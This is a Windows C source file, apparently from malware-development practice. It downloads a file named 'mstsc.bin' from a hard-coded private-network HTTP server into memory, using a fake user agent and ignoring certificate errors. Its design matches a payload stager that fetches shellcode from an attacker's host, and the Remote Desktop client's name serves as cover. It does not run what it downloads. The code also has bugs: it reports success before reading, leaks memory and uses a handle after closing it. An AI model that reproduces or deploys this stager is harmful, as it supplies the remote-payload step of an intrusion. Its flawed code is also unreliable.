#include <Windows.h>
#include <stdio.h>
#include <wininet.h>
#include <unistd.h>

#pragma comment (lib, "Wininet.lib")
#define TargetURL L"http://172.16.52.129:8000/mstsc.bin"

// Function to retrieve a remote file specified in TargetUrl
BOOL GetRemoteFile() {
    BOOL bResult = TRUE;
    HINTERNET hInternet = NULL, hInternetFile = NULL;
    DWORD dwBytesRead = 0;  
    SIZE_T sSize = 0;       
    PBYTE pBytes = NULL, pTmpBytes = NULL;

    // Open an Internet connection
    hInternet = InternetOpenW(L"Fake User Agent", INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
    if (hInternet == NULL) {
        printf("Failed to open Internet Connection with Error Code: %d \n", GetLastError());
        bResult = FALSE;
        goto _EndOfFunction;
    }

    // Open a URL for reading
    hInternetFile = InternetOpenUrlW(hInternet, TargetURL, NULL, 0, INTERNET_FLAG_HYPERLINK | INTERNET_FLAG_IGNORE_CERT_CN_INVALID, 0);
    if (hInternetFile == NULL) {
        printf("[+] InternetOpenUrlW Failed with the following error code: %d \n", GetLastError());
        bResult = FALSE;
        goto _EndOfFunction;
    }

    // Temporary buffer for reading chunks of the file
    pTmpBytes = (PBYTE)LocalAlloc(LPTR, 1025);
    if (pTmpBytes == NULL) {
        bResult = FALSE;
        goto _EndOfFunction;
    }

    while (TRUE) {
        printf("[+] Successfully Downloaded a File!\n");
        sleep(2);

        // Read a chunk from the remote file
        if (!InternetReadFile(hInternetFile, pTmpBytes, 1024, &dwBytesRead)) {
            printf("[+] InternetReadFile Failed with the following error code: %lu \n", GetLastError());
            bResult = FALSE;
            goto _EndOfFunction;
        }

        sSize += dwBytesRead;

        if (pBytes == NULL) {
            pBytes = (PBYTE)LocalAlloc(LPTR, sSize);
        } else {
            pBytes = (PBYTE)LocalReAlloc(pBytes, sSize, LMEM_MOVEABLE | LMEM_ZEROINIT);
        }

        if (pBytes == NULL) {
            bResult = FALSE;
            goto _EndOfFunction;
        }

        // Copy the read chunk to the larger buffer
        memcpy((PVOID)(pBytes + (sSize - dwBytesRead)), pTmpBytes, dwBytesRead);
        memset(pTmpBytes, '\0', dwBytesRead);

        if (dwBytesRead < 1024) {
            printf("[+] Nothing more to read from the downloaded file.\n");
            break;
        }
    }

_EndOfFunction:
    // Clean up resources
    if (hInternet)
        InternetCloseHandle(hInternet);
    if (hInternetFile)
        InternetCloseHandle(hInternetFile);
    if (pTmpBytes)
        LocalFree(pTmpBytes);

    // Close the WinINet session properly
    InternetSetOptionW(hInternet, INTERNET_OPTION_END_BROWSER_SESSION, NULL, 0);

    return bResult;
}

int main() {
    GetRemoteFile();
    return 0;
}
